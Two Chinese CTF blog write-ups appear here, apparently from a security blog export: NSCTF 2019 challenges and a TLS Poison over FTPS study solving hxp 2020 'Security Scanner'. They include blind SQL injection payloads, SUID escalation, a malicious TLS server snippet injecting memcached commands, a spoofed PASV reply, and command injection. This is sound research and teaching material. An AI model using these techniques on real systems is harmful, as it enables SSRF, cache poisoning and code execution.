工具恢复文件，又得到一个CTF_Can_U_Tell_Me_The_Flag的文件夹，发现有.git ，直接用 GitHack 弄下来，在git log中发现 flag Web2Web2地址给了两个，两个地址都不一样…蒙蔽… 第二个地址给了个 GitLab 的地址，我以为官方弄错了啥的，一直怼第一个地址，各种猜，SSRF、注入啥的都猜了结果都没用。 结果在赛后有师傅说 Gitlab 有越权…然后自己扫了一下当真扫到了/root的地址，可以越权访问 Administrator 的页面 或者说可以看到 Administrator 的提交记录 可以看到下面有个 commit 描述：增加读取 flag 代码…然后得到源码… 后面就没什么好说的了…源码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?phpsession_start();function get_contents($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_MAXREDIRS, 0); curl_setopt($curl, CURLOPT_TIMEOUT, 3); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3); curl_setopt($curl, CURLOPT_RESOLVE, array($host . \":\" . $port . \":\" . $ip)); curl_setopt($curl, CURLOPT_PORT, $port); $data = curl_exec($curl); if (curl_error($curl)) { error(curl_error($curl)); } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); if ($status &gt;= 301 and $status &lt;= 308) { $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL); } else { return $data; } }function error($s) { clear_directory(); die(\"&lt;h2&gt;&lt;b&gt;ERROR&lt;/b&gt;&lt;/h2&gt; \" . htmlspecialchars($s));}$msg = \"\";if (isset($_GET[\"url\"])&amp;&amp;\"0769cdd4c5a9d8142a08373826c87baa\"==md5($_GET[\"pass\"])) { $msg = get_contents($_GET[\"url\"]); }?&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;找flag!&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;form&gt; &lt;h1&gt;猜一猜flags在哪里！&lt;/h1&gt; &lt;p&gt;&lt;b&gt;请输入URL：&lt;/b&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"text\" size=\"100\" name=\"url\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input type=\"submit\" value=\"提交\"&gt;&lt;/p&gt; &lt;/form&gt; &lt;?php if (!empty($msg)) echo \"&lt;hr&gt;&lt;p&gt;\" . $msg . \"&lt;/p&gt;\"; ?&gt; &lt;/body&gt;&lt;/html&gt; Web3发现由JSESSIONID=54361A6D54D3993C78020F67804A0248，直接上 struts-scan ，可以扫到s2-045，直接上exp 可以拿到 shell 但是可以发现 flag.txt 只有 600 的权限，查看内核，尝试用CVE-2018-18182进行提权，后来貌似被主办方修了，没提成功。 尝试使用 SUID 进行提权，可以参考【安全科普】Linux提权——利用可执行文件SUID 使用find / -user root -perm -4000 -print 2&gt;/dev/null查看可以拥有 SUID 权限的执行文件： 发现有tac命令，然后直接用tac就可以拿到 flag 了 这里比赛的时候直接用tac可以拿到了，现在又不可以了…不知道是不是这个 exp 的原因…没有深入… 然后也拿到了题目源码，看了一下貌似是个上传的点，不过可以直接用 s2-045 进来可能也是一种预期解法？ Web4没搞出来…给了个 password.txt ，也是给了两个 web 地址，比较迷。 然而用这个文本里面的登录第一个 web admin 账户，没有成功… 看第二个 web 地址回显了一个 mysql 的错误。 不确定是不是被搅屎了…两个 web 地址的脑洞真搞不动… （盲猜第一个进入管理员后用 Rogue mysql 来拿 flag Web5 中间有个按钮用来随机 id ，一看就是个注入题。ban了比较多的关键字，大小写也绕不过，而且还 ban 了information_schema关键字。那就说明不能用一般的注入方法来弄。 尝试 bool 盲注，可以利用 1(case when (hex(substr( database() ,1,1)) in(33) ) then 1 else 0 end) 得到数据库名为 deb7cb73f0ea2b2af2d1e3715fd12044 。接下来怎么弄表名呢？尝试了好一会，绕不过限制，然后题目又提示 flag 长度为32… 然后盲猜 flag 表名库名为 flag ，字段名也是 flag，所以有 1(case when (hex(substr( length(select flag from deb7cb73f0ea2b2af2d1e3715fd12044.flag ) ) ,1,1)) in(33) ) then 1 else 0 end) 发现能得到正确的结果… 后面就像直接直接爆就好了…更扯淡的是… flag 跟数据库名一样… Web6毫无技术含量的题目，伪造 xff 就行了。 Conclusion随便玩玩的比赛…质量不是很好…","link":"/2019/07/07/nsctf-2019/"},{"title":"TLS-Poison 攻击方式在 CTF 中的利用实践","text":"最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。 文章首发于长亭安全课堂：TLS-Poison 攻击方式在真实CTF赛题中的利用实践 https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ PS: 在阅读本文之前，建议您掌握相关的 TLS Poison 先验知识，本文不会再重新详细介绍 TLS Poison 攻击的基础知识 我们首先再来回顾 Black Hat 这个议题，为什么作者使用的是 When TLS Hacks You 呢？而不是 When HTTPS Hack You ，说明这个问题是出现在 TLS 特性身上，所以目前我们貌似都更多只局限地专注在 HTTPS 上，这是比较狭隘的考虑。既然如此，HTTPS 是 HTTP over TLS ，那其他协议是不是也可以呢？比如 FTPS ，FTP over TLS 等等？那我们来看看 FTPS 可以如何使用。 Introduction of FTPS ​ FTPS (also known FTP-SSL, and FTP Secure) is an extension to the commonly used File Transfer Protocol (FTP) that adds support for the Transport Layer Security (TLS) and, formerly, the Secure Sockets Layer (SSL, which is now prohibited by RFC7568) cryptographic protocols. FTPS should not be confused with the SSH File Transfer Protocol (SFTP), a secure file transfer subsystem for the Secure Shell (SSH) protocol with which it is not compatible. It is also different from FTP over SSH, which is the practice of tunneling FTP through an SSH connection. 首先简单介绍一下 FTPS ，FTPS 是一种对常用的文件传输协议（FTP）添加传输层安全（TLS）和安全套接层（SSL）加密协议支持的扩展协议。 在 HTTPS 横空出世之后，SSL 协议也应用到了 FTP 上，随后在 1996 发布了 FTPS 的一个草案 Secure FTP over SSL ，但是直到 2005 年才最终确定终稿 RFC 4217 - Securing FTP with TLS 。然而实际上，FTPS 拥有两种模式，这里并非指的是 FTP 的主动、被动模式，而是显式、隐式模式。 Implicit Mode在隐式模式下，FTPS 的默认端口在 990 端口上，隐式模式下所有的连接数据均为加密。 客户端必须先使用 TLS Client Hello 消息向 FTPS 服务器进行握手来创建加密连接，如果 FTPS 服务器未收到此类消息，则服务器应断开连接。 为了保持与现有的非 FTPS 感知客户端的兼容性，隐式 FTPS 默认在 IANA 规定的端口 990/TCP 上监听 FTPS 控制通道，并在端口 989/TCP 上监听 FTPS 数据通道。这使得管理员可以保留端口(控制通道 21/TCP 与数据通道 20/TCP )以兼容原始的FTP。 虽然我没有查找到隐式 FTPS 的相关历史，但是我个人觉得他更像在 SSL 时代应运而生的产物，更符合了 FTP over SSL 的意思，也就是一开始使用 TLS/SSL 进行会话创建，再进行数据加密传输。但 RFC 4217 中未定义隐式模式，因此它也被认为是FTP协商TLS/SSL中过时的早期方法。 Explicit Mode在显式模式（也称为FTPES）下，FTPS 客户端先与服务器创建明文连接，然后从控制通道明确请求服务端升级为加密连接（命令为: AUTH TLS）。控制通道与数据通道默认端口与原始 FTP 一样也是 21 端口。控制通道始终加密，而数据通道是否加密则为可选项。 同时若服务器未限制明文连接，也可以使用未加密的原始 FTP 进行连接，也就是说服务器在相同的端口上同时提供 FTP 与 FTPS 服务。 与FTP协商认证和安全的机制是在 RFC 2228 下增加的，其中包括新的 FTP 命令 AUTH 。虽然该 RFC 没有明确定义任何所需的安全机制，如 SSL 或 TLS ，但它确实要求 FTPS 客户端用一个双方都知道的机制挑战 FTPS 服务器。如果 FTPS 客户端用一个未知的安全机制挑战 FTPS 服务器， FTPS 服务器将以错误代码 504（不支持）响应 AUTH 命令。客户可以通过使用 FEAT 命令查询 FTPS 服务器来确定支持哪些机制，尽管服务器不一定需要诚实地披露它们支持哪些安全级别。调用 FTPS 安全的常见方法包括 AUTH TLS 和 AUTH SSL 。显式方法在 RFC 4217 中定义后，FTPS的合规性要求客户端始终使用 AUTH TLS 方法进行协商。 我们可以在 RFC 4217 中找到显式 FTPS 建立连接方式： 12345678910111213141516171819202122232425262728293031323334 Client Server control data data control==================================================================== socket() bind() socket() connect() ----------------------------------------------&gt; accept() &lt;---------------------------------------------- 220 AUTH TLS ----------------------------------------------&gt; &lt;---------------------------------------------- 234 TLSneg() &lt;----------------------------------------------&gt; TLSneg() PBSZ 0 ----------------------------------------------&gt; &lt;---------------------------------------------- 200 PROT P ----------------------------------------------&gt; &lt;---------------------------------------------- 200 USER fred ----------------------------------------------&gt; &lt;---------------------------------------------- 331 PASS pass ----------------------------------------------&gt; &lt;---------------------------------------------- 230Note 1: The order of the PBSZ/PROT pair and the USER/PASS pair (withrespect to each other) is not important (i.e., the USER/PASS canhappen prior to the PBSZ/PROT, or the server can refuse to allow aPBSZ/PROT pair until the USER/PASS pair has happened).Note 2: The PASS command might not be required at all (if the USERparameter and any client identity presented provide sufficientauthentication). The server would indicate this by issuing a '232'reply to the USER command instead of the '331', which requests a PASSfrom the client (see below).Note 3: The AUTH command might not be the first command after thereceipt of the 220 welcome message. 数据传输阶段： 1234567891011121314151617181920212223242526272829303132333435363738394012.6. A Standard Data Transfer with Protection Client Server control data data control ==================================================================== socket() bind() PORT w,x,y,z,a,b --------------------------------------------&gt; &lt;-------------------------------------------------------- 200 STOR file ---------------------------------------------------&gt; socket() bind() &lt;-------------------------------------------------------- 150 accept() &lt;---------- connect() TLSneg() &lt;----------&gt; TLSneg() TLSwrite() ----------&gt; TLSread() TLSshutdown() -------&gt; TLSshutdown() close() ----------&gt; close() &lt;-------------------------------------------------------- 22612.7. A Firewall-Friendly Data Transfer with Protection Client Server control data data control ==================================================================== PASV --------------------------------------------------------&gt; socket() bind() &lt;------------------------------------------ 227 (w,x,y,z,a,b) socket() STOR file ---------------------------------------------------&gt; connect() ----------&gt; accept() &lt;-------------------------------------------------------- 150 TLSneg() &lt;---------&gt; TLSneg() TLSwrite() ---------&gt; TLSread() TLSshutdown() -------&gt; TLSshutdown() close() ---------&gt; close() &lt;-------------------------------------------------------- 226 TLS Poison In FTPS看到如上解释，想必大家可能也会有思考，那么是不是 FTPS 也会有 TLS 会话重用的特性呢？那么是不是也可以跟 TLS Poison 相关联起来呢？ Explicit首先我们来先看看拥有 RFC 4217 规范的显示 FTPS ，我们可以借用 pyftpdlib 来做一个简单的 FTPS Server 12345678910111213141516171819202122232425\"\"\"An RFC-4217 asynchronous FTPS server supporting both SSL and TLS.Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL).\"\"\"from pyftpdlib.servers import FTPServerfrom pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import TLS_FTPHandlerdef main(): authorizer = DummyAuthorizer() # authorizer.add_user('ftpuser', 'ftpuser123', '.', perm='elradfmwMT') authorizer.add_anonymous('.') handler = TLS_FTPHandler handler.certfile = 'keycert.pem' handler.authorizer = authorizer # requires SSL for both control and data channel handler.tls_control_required = True handler.tls_data_required = True server = FTPServer(('', 11211), handler) server.serve_forever()if __name__ == '__main__': main() 对于客户端我们可以使用 curl 来发起一个显式 FTPS 请求： 1curl --ftp-ssl --user name:passwd ftp://ftp.host.com/ 如果需要用户验证就加上--user选项即可，不需要的话就不用，结果如图所示： 我们可以清楚的看到在显式 FTPS 在使用AUTH SSL命令之后才与服务器建立的 TLS 连接，并在LIST之后我们可以看到重新使用了 TLS Session 。 这里我们简单回顾一下，在利用 HTTPS 进行 TLS Poison 时，我们需要再次使用 HTTP 重定向让客户端重新与我们建立会话，但是仔细观察 FTPS ，我们并没有使用类似 HTTPS 重定向的功能让其再次与 FTPS 服务器建立连接，那为什么我们只是简单访问一次 FTPS 服务器就会产生会话重用的现象呢？ 让我们看之前发生了什么，客户端使用了EPSV命令表示使用 FTP 被动模式，FTP 服务器以(||||32949)对该命令进行了回复。 这里我们简单回顾一下 FTP 的被动模式：在被动模式的 FTP 中，客户端启动到服务器的两个连接，解决了防火墙阻止从服务器到客户端的传入数据端口连接的问题。FTP 连接建立后，客户端在本地打开两个随机的非系统端口 N 和 N + 1(N &gt; 1023)。第一个端口连接服务器上的 21 端口，但是客户端这次将会发出 PASV 命令，也就是不允许服务器连接回其数据端口。这样，服务器随后会打开一个随机的非系统端口 P (P &gt; 1023)，并将 P 发送给客户端作为 PASV 命令的响应。然后客户端启动从端口 N+1 到端口 P 的连接来传输数据。其中EPSV命令为PASV的更新版本，主要为了兼容 IPv6 而在 RFC 2428 中定义的。 所以在被动模式中，我们可以借由上图清楚的明白，在数据传输阶段，客户端需要与服务端重新建立一次连接！而在显式 FTPS 当中，重新建立连接就可以重新使用 TLS 会话，也就意味着可能被 TLS Poison 攻击！ Implicit对于隐式模式，因为一开始就需要建立 TLS 会话，所以即使没有 RFC 规定，理论上也很明显应该也同样会支持 TLS 会话重用的机制。 这里我们可以使用 vsftpd 来进行简单实验，安装 vsftpd 后在 /etc/vsftp.conf 中开启implicit_ssl=YES选项 参考配置： 12345678910111213141516171819202122232425262728293031323334353637listen=NOlisten_ipv6=YESanonymous_enable=YESlocal_enable=YESwrite_enable=YESlocal_umask=022anon_root=/var/ftp/no_anon_password=YEShide_ids=YESdirmessage_enable=YESuse_localtime=YESxferlog_enable=YESconnect_from_port_20=YESsecure_chroot_dir=/var/run/vsftpd/emptypam_service_name=vsftpdpasv_enable=Yespasv_min_port=10000pasv_max_port=11000rsa_cert_file=/home/ubuntu/tls/fullchain.pemrsa_private_key_file=/home/ubuntu/tls/privkey.pemssl_enable=YESssl_ciphers=HIGHallow_anon_ssl=YESforce_local_data_ssl=YESforce_local_logins_ssl=YESssl_tlsv1=YESssl_sslv2=NOssl_sslv3=NOlisten_port=11211implicit_ssl=YES 请按照其他教程申请对应域名证书、配置好匿名 ssl 访问 vsftpd ，否则很容易导致 vsftpd 报错，并且检查好 vsftpd 状态是否成功运行。 配置好 vsftpd 后使用 curl 进行访问: 1curl ftps://exmaple.com -v 这里我另外增加了--tls-max 1.2选项，因为在 TLS 1.3 当中， Session ID 传输在加密过程中，不便观察，而 TLS 1.2 可以在 Server Hello 消息中看到 TLS Server 设置的 Session ID，所以这里我们使用--tls-max 1.2迫使 curl 最大使用 TLS 1.2 版本。 我们就可以观察到如下图所示现象： 可以看到也是在使用PASV命令之后，也就是数据传输阶段时，重新使用了 Session ID 进行建立 TLS 会话。 PASV既然确定了可以重用 TLS 会话，那么接下来的一个问题就是 DNS Rebinding 的问题，也是 TLS Poison 攻击中的关键问题。 但是众所周知，特别是在过去的一年当中，FTP 在 CTF 中的利用出现得也算比较多的了，利用主动、被动模式进行 SSRF 也不并不是新鲜的 Trick 了，所以在这里我们还可以 FTPS 服务端向客户端默认发送的PASV命令给予恶意回复为227 Entering Passive Mode (127,0,0,1,43,203)，就可以得到一个简单的 “DNS Rebinding” 效果了。 但是众所周知，这种小 Trick 应该被视为一种漏洞，因为在设计之初，本来就应该将 FTP 客户端、服务端进行绑定，也就是说，无论 FTP 使用被动还是主动模式，都应该是服务端与客户端之间进行建立控制流与数据流，并不应该与第三者进行，况且如果攻击者恶意将数据流定向到内网端口就极易产生 SSRF 。 所以，Firefox 早在 2007 年就修复了 FTP 带来的这个问题，并分配了 CVE 编号：CVE-2007-1562 ，而 curl 迟迟在 2020 年才被发现这类问题并修复，也分配了 CVE 编号：CVE-2020-8284。curl 版本在 4.0 与 7.73.0 之间都会受到该种漏洞的影响，详见：trusting FTP PASV responses 所以对于 FTPS 来说，只要存在PASV这个漏洞，就可以非常方便地使用 TLS Poison 进行攻击。具体步骤为： curl 访问 ftps 服务器，并与其建立 tls 握手 ftps 服务器在建立 tls 连接时设置恶意 session id ftps 对于 curl 发出的pasv命令返回(127,0,0,1,43,203)，并等待接下来的LIST等命令 之后 curl 才会与 127.0.0.1:11211 尝试重用 session id 建立 TLS 会话 好了，熟悉了 TLS Poison 攻击以及确定 FTPS 两个形式都可能受到 TLS Poison 攻击，那接下来我们就来亲自体验一下在 CTF 当中的应用吧。 HXP CTF - Security Scanner这是来自 2020 年 hxp CTF 当中的一道 web 方向题目，到 hxp 比赛结束只有两解，算是一道比较难的题目。这个题目其实我很早就做复盘的一个题，利用了今年 DEF CON 等 web 的时间把这个题做了一次简单的复盘。 Description ​ Finally, after all these years computers are stealing my job. Try our new robotic security scanner. Author: 0xbb 主要题目源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpsession_start();if (!isset($_SESSION['sandbox'])) { $id = ''; while(strlen($id) &lt; 10) { $b = random_bytes(1); if(ord($b) &gt; 32 &amp;&amp; ord($b) != 0x7f) { $id .= $b; } } $_SESSION['sandbox'] = $id;}echo '&lt;h1&gt;Sandbox&lt;/h1&gt;';echo '&lt;code&gt;'.base64_encode($_SESSION['sandbox']).'&lt;/code&gt;'; $m = new Memcached();$m-&gt;addServer('127.0.0.1', 11211);$url = strval($_GET['url']);if ($m-&gt;get($_SESSION['sandbox'].$url) !== 'OK') { if(preg_match('/^[0-9a-zA-Z:\\.\\/-]{1,64}$/', $url) !== 1) { die('security :('); } $git_check = \"001e# service=git-upload-pack\\n\"; $data = file_get_contents($url .'/info/refs?service=git-upload-pack'); if ($data === FALSE || substr($data, 0, strlen($git_check)) !== $git_check) { die(\"doesn't look like git :(\"); } $m-&gt;set($_SESSION['sandbox'].$url, 'OK', time() + 300);}$output = [];$return_var = 1;exec(\"timeout -s KILL 3 git ls-remote --tags -- $url\", $output, $return_var);if($return_var !== 0) { die('analysis failed :(');}echo '&lt;h1&gt;Analysis&lt;/h1&gt;';echo \"URL: ${url}\";echo '&lt;h2&gt;Tags&lt;/h2&gt;';echo '&lt;ul&gt;';foreach($output as $l) { echo \"&lt;li&gt;&lt;code&gt;${l}&lt;/code&gt;&lt;/li&gt;\";}echo '&lt;/ul&gt;';echo '&lt;h2&gt;Result&lt;/h2&gt;';if(TRUE) { // patented algorithm (tm) echo 'Likely insecure :('; } Analyze审计代码，我们可以总结出代码执行的主要流程如下： 生成随机字符串做 SANDBOX 用户输入 url 后，从 Memecached 中获取键值为 SANDBOX + url 的 Value 值，判断是否为 “OK” 如果不是，通过^[0-9a-zA-Z:\\.\\/-]{1,64}$正则后，通过file_get_contents访问$url .'/info/refs?service=git-upload-pack'，检查结果是否以001e# service=git-upload-pack\\n开头 如果不是以001e# service=git-upload-pack\\n开头，则结束程序 如果是，则会在 Memecached 中将键值为 SANDBOX + url 的 Value 值设置为 “OK”，时间为 5min 如果是 “OK” ，则会使用exec执行命令timeout -s KILL 3 git ls-remote --tags -- $url，如果访问成功则输出响应 整个代码流程如下图所示： Solution 1From: https://github.com/dfyz/ctf-writeups/tree/master/hxp-2020/security%20scanner 我们先来看看第一种解法，这也是 perfect guesser 他们使用的类似解法，通过 HTTPS 来进行解题。 题目唯一一处可以让我们直接执行命令的地方就是exec处了，所以如果没有其他校验验证的话，我们可以直接使用命令注入进行 RCE ，例如传入url=;/readflag，这样题目执行顺序如下流程图所示： 这样题目在执行我们的命令时，就也会把回显显示给我们了，也就拿到 FLAG 了。 既然最后一步我们知道了，我们就得想办法如果绕过前面的验证步骤。主要验证也就是如下两个步骤： 正则表达式：^[0-9a-zA-Z:\\.\\/-]{1,64}。表达式比较严格，看起来并没有什么可以让我们进行命令注入的机会。 即使绕过了正则，但是file_get_contents并不会认为;/readflag是合法协议，也不能接着去执行。 所以问题就来到了如何将我们的 payload 写入 memcached 当中以及我们如何绕过前面两个正则。 既然是要写入 memcached 我们不难想到 2020 年 black hat 上的议题 When TLS Hack You ，其中作者使用的 demo 就是通过 TLS 配合 DNS Rebinding 来对 memcached 发起 SSRF 攻击，所以如何将我们的 payload 写入到 memcached 当中基本有了个大致的思路，问题是如何实现利用这个思路呢？ 我们再来看看如果真是使用 TLS Poison 攻击的话，使用 HTTPS 是不是就可以满足以上两个限制的条件了呢？确实如此，https://并没有使用其他禁止的字符，并且我们可以通过 HTTPS 让题目的file_get_contents得到任意内容，包括满足他所需要的001e# service=git-upload-pack\\n这个条件。 所以似乎看起来 TLS Poison 正是这个题目的关键！如果是这样的话，接下来我们就需要确定，我们应该使用 file_get_contents还是 git 来进行操作呢？也就是说哪一个支持 TLS 会话重用这个特性呢？我们知道file_get_contents并没有依赖 libcurl ，我们如果直接查看 PHP 源代码有点麻烦，不如直接通过让其访问我们 TLS Poison Demo 来测试，如果能有支持 TLS 会话重用，在 302 时，也就是第二次访问我们 TLS Server 即会带上 Session ID ，这个我们可以直接用wireshark 本地抓包即可看到了。但是经过测试其实我们可以看到file_get_contents并没有在第二次 TLS 会话时重用 Session ID，如图所示： 所以接下来我们就只能寄希望于 git 了，那么 git 是否支持 TLS 重用会话？怎么确定 git 是否支持 TLS 会话重用呢？我们能不能确定 git 使用的是什么网络请求资源依赖库呢？比如 libcurl ？如果是 libcurl ，我们就好办了，因为明确知道 libcurl 对于 HTTPS 的支持是可以支持会话重用的，至少对于 OpenSSL 或者 GnuTLS 来说，都是支持此项特性的。 那么到底如何确定呢？这有点类似于找一个站点使用了什么 web 框架，一般来说我们可以尝试通过找站点特征、报错回显等方式来确定，但是 git 发起网络请求的 User-Agent 中只带了它自己的 UA 特征，并没有显示是否使用 libcurl ，在代码中虽然可以找到&lt;curl/curl.h&gt;，但是到底用没用我们似乎不是很好判断；所以我们可以尝试通过报错回显来确定 git 到底用没用 libcurl (idea from @zsx )，如何引起这个报错呢？不难想到我们可以尝试用一个 libcurl 不支持的协议来确定，比如 gopher 协议。接下来我们可以在自己服务器上放一个 php 让其 Location 跳转到 gopher 协议上，例如： 123456$ cat 302.php &lt;?php header(\"Location: gopher://localhost/\");$ git ls-remote --tags -- http://localhost/302.php fatal: unable to access 'http://localhost/302.php/': Protocol \"gopher\" not supported or disabled in libcurl 我们就可以看到明显的 libcurl 错误回显。 既然确定了可以使用 git 来进行 TLS Poison 攻击 Memcached ，那么具体我们应该这么做呢？我们从 getFlag 开始来看看： 要让exec执行;/readflag，我们要让;/readflag在 Memcached 中的 Value 为 “OK” 那怎么写入;/readflag呢？我们可以利用 git 来实施 TLS Poison ，向 Memcached 中写入 Key 为;/readflag，Value 为 “OK” 那怎么实施 TLS Poison 呢？部署 HTTPS Server ，先绕过之前两个限制，在 git 请求 HTTPS Server 的时候实行 TLS Poison 具体流程图如下： 其中我们可以使用双 A 记录的方法来优化 DNS Rebinding 方式，具体关于 TLS Poison 详细解释见：一篇文章带你读懂 TLS Poison 攻击 这里 wp 作者放出的 exp 其实并不可用，在 TLS 握手时会产生错误，所以我又不得不使用其他工具实现这个 exp ，而整个 exp 构造中比较关键的地方在于，如何让file_get_contents正常获取到指定内容后，git 再访问时就需要使用恶意的 TLS Server 。对于这个点，我们可以从请求的 UA 上做区分，判断 UA 中是否有 git 来区分这两者请求来返回对应的响应，所以 rustls 我就不考虑了…这玩意着实难改，于是选用了 tlslite-ng 作为 TLS 服务器，并修改MySimpleHTTPHandler函数中的处理 HTTP 请求的关键代码，如下： 12345678910111213141516171819202122if 'git' in str(self.headers): print('This is git! Redirecting it back to memcached and shutting down') assert session_id, 'Session id should have been set at this point' headers = { 'Location': f'https://tls.exmaple.com:11211/pwned', } self.wfile.write(get_http_response(302, headers, '')) returnelse: print('This is PHP! Showing them something that looks like a git repo and stealing sandbox ID') b64_sandbox_id = re.search('/(.{14})/', self.path).group(1) while len(b64_sandbox_id) % 4 != 0: b64_sandbox_id += '=' sandbox_id = base64.b64decode(b64_sandbox_id) assert len(sandbox_id) == 10, f'The sandbox id should have exactly 10 bytes, got: {sandbox_id}' session_id = b'\\r\\nset ' + sandbox_id + b';/r* 0 0 2\\r\\nOK\\r\\n' assert len(session_id) == 32, f'The session should have exactly 32 bytes, got: {session_id}' print(f'Got sandbox id: {sandbox_id}, session_id: {session_id}') fake_git = '001e# service=git-upload-pack\\n' self.wfile.write(get_http_response(200, {}, fake_git)) return 这里因为题目设置了 sandbox ，占用了 10 字节，而 TLS 1.2 中的 SessionID 局限于 32 字节，所以我们没办法直接使用;/readflag，否则会超出长度，直接使用;/r*也可以执行读取 flag 命令。最后打包整理的 Exp 放在：https://github.com/ZeddYu/TLS-poison/tree/master/Practice1-hxp2020/solution1 在自己的服务器上搭建好 TLS 服务器之后，最后用 exp.py 自动发包就能拿到 flag 了： Solution 2当然如果只是简单的复现 TLS Poison 我也不会这么详细的写一篇文章来讲这个题了， CTF 能带给我最大的快乐就是看到一些在自己预期之外的东西，这些东西往往都更有意思，也更 Amazing 。 结合前文，我们这里可以尝试使用 FTPS 来进行解答这个题目。如果使用 FTPS ，那么重定向、DNS Rebinding 的操作我们就可以不需要了，因为可以使用PASV直接将数据通道指向 127.0.0.1:11211 即可。 那么接下来就需要确定 git 中的 libcurl 是否受到PASV漏洞影响了，我们可以从 git 版本、简单搭建一个恶意的 FTP 服务器进行测试，这里就不展开进行测试了。（其实是比较懒）我们这里就直接开始尝试使用 FTPS 进行解题。 按照之前的流程，我们需要确定几个点： 如何绕过之前题目使用file_get_contents对文件内容确认？我们可以直接创建/info/ref文件，内容为题目要求的内容即可 如何绕过正则？我们只需要配置好匿名 ftps 即可，就不需要引入为了用户认证而使用的@符号了，其余的字符就属于正则内的字符了 用隐式还是显式？因为我们使用的格式是ftps://ftps.exmaple.com:11211/这种形式，这只能是隐式 FTPS 的格式，所以使用隐式 FTPS 剩下的便是如何构造 exp 的问题了，怎么去弄一个隐式 FTPS ，难道还要修改个恶意 vsftpd ？那样比较麻烦，这里我们可以使用 rustls 的转发功能，该功能可以帮我们处理了 TLS 创建的问题，并且按照之前的基础，我们也可以把它直接作为恶意 TLS 服务器，这样我们就只需要弄一个 socket 用来处理 FTP 即可。 依旧使用我仓库的 TLS 工具：https://github.com/ZeddYu/TLS-poison/ ，按照 setup 做好初始化后，使用如下命令开启 rustls 的转发功能，将 TLS 上层流量转发到 2048 端口： 1TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048 然后在 2048 端口我们弄个 socket 监听并读一下 FTP ，然后就是处理 FTP 命令的事情了，这里可以使用 vsftpd 来进行命令响应的参考，最后实现：https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/curl_exp.py PS：这里 FTP 服务记得要完整实现对 PASV 之后的命令处理，否则攻击失败。 天知道这个坑了我多久…当时死活都不能复现，问作者 0xbb 也不知道什么情况，又是排 curl 版本，又是排 git 版本，又是排 OpenSSL ，又是排 GnuTLS ，反正各种排 bug ，万念俱灰，最后才找到这个地方…简直 这里我自己编译了一个存在pasv漏洞的 curl 调试，访问我们的 ftps 服务器之后就会对我们 127.0.0.1:11211 进行 TLS 会话重用，就会将我们的 payload 发送到 11211 端口了： 写入之后基本上就没有什么问题了。 整个流程我们整理一下： 首先得访问一次题目拿到 cookie 一开始的file_get_contents我们可以使用 vsftpd 来在匿名 ftp 目录下放置/info/ref文件，文件内容就是 “001e# service=git-upload-pack\\n” 题目使用file_get_contents访问之后，我们就可以关闭 vsftpd ，然后开启 rustls 恶意 TLS 服务器，注意提前设置在 redis 当中设置好 payload 题目执行exec，也就是使用 git 来访问我们的 FTPS 服务器时，双方建立 TLS 握手，我们会设置可以执行读取 flag 的 Session ID 建立握手完毕后，执行 FTP 流程 在题目 git 处理 FTP 流程中，我们会给 git 发出的PASV命令请求的响应227 Entering Passive Mode (127,0,0,1,43,203)\\r\\n git 会根据得到的 127.0.0.1:11211 这个地址尝试进行 TLS 会话重用 至此，完成对 Memcached 的攻击，成功写入\\r\\nset 1234567890;/r* 0 0 2\\r\\nOK\\r\\n，其中那串连续数字我用来表示 sandbox id 带着最开始设置的 cookie 向题目提交 url 地址为;/r*，此时题目向 Memcached 查询 1234567890;/r*的值，得到 url 的值为 OK ，绕过限制 题目执行exec(\"timeout -s KILL 3 git ls-remote --tags -- $url\", $output, $return_var);，其中$url就是我们传入的;/r*，完成命令注入，执行读取 flag 命令拿到 flag 至此，完成这个题目的 FTPS 解法。exp 效果图如下： Something else其实这个解法也是后来问的 0xbb 出题人，其实预期解法是利用 FTPS 的解法。但是比赛的时候，队友还找到了一处其他可能的地方想着 SSRF 来着，但是后来不太行，后面跟 Perfect Blue （也就是这次参赛的联合战队 perfect guesser 的联合队之一）的朋友交流了一下确实是用 TLS Poison ，并且他跟 A0E 某个师傅一样也重写了 DNS 相关部分内容2333 如果你觉得做完这个题目还觉得不过瘾，还可以去做一下 Tet CTF 的一个题目。在越南的 TetCTF 2021 当中，有一个单独的分类 Web &amp; Crypto 有这么一道题：HackEmAll-Next-Gen-Proxy ，这道题当中就比较直接： 123456789101112131415161718def _set_cache(_key, _value): if str(_key) != \"\" and str(_value) != \"\": _cache_handle = pylibmc.Client([\"127.0.0.1:11211\"], binary=False) _cache_handle.set(_key, _value, time=60) return True else: return Falsedef _get_cache(_key): _cache_handle= pylibmc.Client([\"127.0.0.1:11211\"], binary=False) return _cache_handle.get(_key)def parse(_url): _cmd = [\"curl\", \"-L\", \"-k\", str(_url)] _content = subprocess.check_output(_cmd) return _content.encode('hex') 这个就已经有非常明显的提示了，同样是熟悉的 Memcached ，同样是-L选型特地允许 curl 重定向，很标准的一道 TLS Poison 题目，这里就不再多啰嗦了。不过对于这题，以及-L选项，当时有选手想出使用 gopher 来做这个题，本地都能打，但是到了远程就拉垮了，原因是在新版的 curl 中，就像我们一开始验证的一样， gopher 协议已经不再是 libcurl 默认支持的重定向协议了，只有 HTTP/HTTPS 和 FTP 是默认支持重定向，具体见：https://github.com/curl/curl/commit/6080ea098d97393da32c6f66eb95c7144620298c Conclusion至此，本篇加上之前的 《一篇文章带你读懂 TLS Poison 攻击》 ，基本上算是把 TLS Poison 的理论、实践、 CTF 